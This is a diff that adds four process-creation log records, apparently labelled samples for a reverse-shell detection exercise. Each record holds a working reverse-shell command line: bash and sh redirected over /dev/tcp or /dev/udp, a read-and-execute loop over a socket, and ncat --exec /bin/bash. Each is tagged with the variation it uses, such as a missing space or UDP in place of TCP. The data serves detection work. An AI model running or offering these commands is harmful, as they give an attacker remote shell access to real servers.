@@ -1,0 +1,4 @@
+{"EventID":1,"Image":"/usr/bin/bash","CommandLine":"bash -i>& /dev/tcp/192.0.2.10/4444 0>&1","ParentImage":"/usr/bin/python3","User":"www-data","_dojo":{"technique":"no space before the redirect"}}
+{"EventID":1,"Image":"/bin/bash","CommandLine":"/bin/bash -c \"exec 5<>/dev/tcp/203.0.113.9/9001; cat <&5 | while read line; do \\$line 2>&5 >&5; done\"","ParentImage":"/usr/bin/python3","User":"www-data","_dojo":{"technique":"read-and-execute loop over a file descriptor"}}
+{"EventID":1,"Image":"/usr/bin/ncat","CommandLine":"ncat --exec /bin/bash 192.0.2.10 4444","ParentImage":"/bin/sh","User":"www-data","_dojo":{"technique":"long option name"}}
+{"EventID":1,"Image":"/bin/sh","CommandLine":"sh -i >& /dev/udp/192.0.2.10/4444 0>&1","ParentImage":"/usr/bin/python3","User":"www-data","_dojo":{"technique":"UDP instead of TCP"}}
